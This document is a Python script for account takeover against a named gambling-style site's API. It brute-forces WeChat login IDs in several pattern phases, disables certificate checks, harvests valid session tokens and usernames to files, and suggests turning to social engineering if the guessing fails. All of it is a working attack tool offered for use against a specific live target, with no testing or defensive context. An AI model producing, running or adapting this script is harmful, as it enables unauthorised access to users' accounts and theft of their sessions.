#!/usr/bin/env python3
"""bf1788.com WechatLogin Account Takeover - Comprehensive ID Collector"""
import requests, urllib3, json, time, os, random, string, itertools

urllib3.disable_warnings()
TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def wechat_login(wechatId):
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            if isinstance(msg, dict) and msg.get("sid"):
                return msg.get("sid"), msg.get("username")
    except:
        pass
    return None, None

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

def scan_phase(name, patterns, save_dir="."):
    log(f"Starting {name}...")
    found = []
    
    for i, wid in enumerate(patterns):
        sid, username = wechat_login(wid)
        if sid:
            log(f"[+] FOUND: {wid}, sid={sid}, username={username}")
            found.append({"wechatId": wid, "sid": sid, "username": username})
            
            with open(f"{save_dir}/found_wechatids.txt", "a") as f:
                f.write(f"{wid}|{sid}|{username}|{name}\n")
        
        if (i + 1) % 5000 == 0:
            log(f"{name} Progress: {i+1}/{len(patterns)} (found: {len(found)})")
    
    log(f"{name} complete! Found: {len(found)}")
    return found

def main():
    save_dir = "."
    os.makedirs(save_dir, exist_ok=True)
    
    all_found = []
    
    # Phase 1: Expanded numeric (testwechat00001-99999)
    log("=== Phase 1: Expanded numeric ===")
    numeric_patterns = [f"testwechat{i:05d}" for i in range(1, 100000)]
    all_found.extend(scan_phase("Numeric", numeric_patterns, save_dir))
    
    # Phase 2: Derivation patterns (user/test/admin...)
    log("=== Phase 2: Derivation patterns ===")
    prefixes = ["user", "test", "admin", "guest", "demo", "master", "root",
                "agent", "member", "player", "vip", "game"]
    deriv_patterns = [f"{p}{i:03d}" for p in prefixes for i in range(1, 10001)]
    all_found.extend(scan_phase("Derivation", deriv_patterns, save_dir))
    
    # Phase 3: UUID-style patterns
    log("=== Phase 3: UUID patterns ===")
    uuid_prefixes = ["a1b2c3d4", "e5f6a7b8", "00000000", "ffffffff",
                     "deadbeef", "cafebabe", "12345678", "abcdef01"]
    uuid_patterns = []
    for prefix in uuid_prefixes:
        for i in range(1, 10001):
            suffix = f"{i:024d}"[:24]
            uuid_patterns.append(prefix + suffix)
    all_found.extend(scan_phase("UUID", uuid_patterns, save_dir))
    
    # Phase 4: Social patterns
    log("=== Phase 4: Social patterns ===")
    surnames = ["zhang", "li", "wang", "liu", "chen", "huang", "zhao",
                "wu", "zhou", "qian", "sun", "ma", "hou", "lin"]
    social_patterns = [f"{s}{i:03d}" for s in surnames for i in range(1, 1001)]
    all_found.extend(scan_phase("Social", social_patterns, save_dir))
    
    # Deduplicate
    seen = set()
    unique = []
    for item in all_found:
        if item["wechatId"] not in seen:
            seen.add(item["wechatId"])
            unique.append(item)
    
    # Save final results
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    with open(f"{save_dir}/collected_wechatids_{timestamp}.json", "w") as f:
        json.dump({
            "timestamp": timestamp,
            "target": TARGET,
            "total_found": len(unique),
            "accounts": unique
        }, f, indent=2)
    
    log(f"=== Collection Complete ===")
    log(f"Total accounts found: {len(unique)}")
    log(f"Results saved to: collected_wechatids_{timestamp}.json")
    
    if unique:
        log("Found accounts:")
        for item in unique:
            log(f"wechatId: {item['wechatId']}, sid: {item['sid']}")
    else:
        log("No new accounts found")
        log("Recommendation: Focus on social engineering attack")

if __name__ == "__main__":
    main()
